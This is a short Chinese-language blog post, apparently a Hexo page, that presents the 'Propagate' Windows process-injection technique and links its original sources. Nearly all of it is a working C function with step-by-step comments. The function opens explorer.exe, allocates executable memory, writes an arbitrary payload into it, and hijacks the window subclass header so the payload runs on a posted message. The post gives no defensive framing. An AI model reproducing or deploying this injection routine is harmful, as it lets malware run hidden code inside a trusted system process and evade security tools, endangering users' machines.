---
title: Propagate
date: 2018-09-04 19:51:47
tags: Windows
categories: Windows
---
![enter description here][1]
<!--more-->
https://github.com/odzhan/injection
https://modexp.wordpress.com/2018/08/23/process-injection-propagate/

它适用于Windows 7和10，但不执行错误检查，因此可能导致explorer.exe崩溃或其他一些意外行为。

``` stylus
VOID propagate(LPVOID payload, DWORD payloadSize) {
    HANDLE          hp, p;
    DWORD           id;
    HWND            pwh, cwh;
    SUBCLASS_HEADER sh;
    LPVOID          psh, pfnSubclass;
    SIZE_T          rd,wr;
    // 1.获取父窗口句柄 
    pwh = FindWindow(L"Progman", NULL);
    //2.获取子窗口句柄 
    cwh = FindWindowEx(pwh, NULL, L"SHELLDLL_DefView", NULL);
    // 3.获取子类标题的句柄 
    p = GetProp(cwh, L"UxSubclassInfo");
    // 4.获取explorer.exe的进程ID 
    GetWindowThreadProcessId(cwh, &id);
    // 打开explorer.exe 
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
    //6.读取当前子类标题
    ReadProcessMemory(hp, (LPVOID)p, &sh, sizeof(sh), &rd);
    // 7.为新的子类标题分配RW内存 
    psh = VirtualAllocEx(hp, NULL, sizeof(sh),
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    //8.为有效负载分配RWX内存
    pfnSubclass = VirtualAllocEx(hp, NULL, payloadSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    // 9. 将payload写入内存
    WriteProcessMemory(hp, pfnSubclass,
        payload, payloadSize, &wr);
    // 10.将pfnSubclass字段设置为有效负载地址，并将
    // 写回到处理内存 
    sh.CallArray[0].pfnSubclass = (SUBCLASSPROC)pfnSubclass;
    WriteProcessMemory(hp, psh, &sh, sizeof(sh), &wr);

    // 11.使用SetProp 
    SetProp(cwh, L"UxSubclassInfo", psh);
    // 12.触发经由窗口消息payload
    PostMessage(cwh, WM_CLOSE, 0, 0);
    // 13.恢复原始子类标题
    SetProp(cwh, L"UxSubclassInfo", p);
    // 14.可用内存和关闭句柄
    VirtualFreeEx(hp, psh, 0, MEM_DECOMMIT | MEM_RELEASE);
    VirtualFreeEx(hp, pfnSubclass, 0, MEM_DECOMMIT | MEM_RELEASE);

    CloseHandle(hp);
}
```


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/DF31317B9D858CFDD64A2D5AB8B8ACBD.jpg 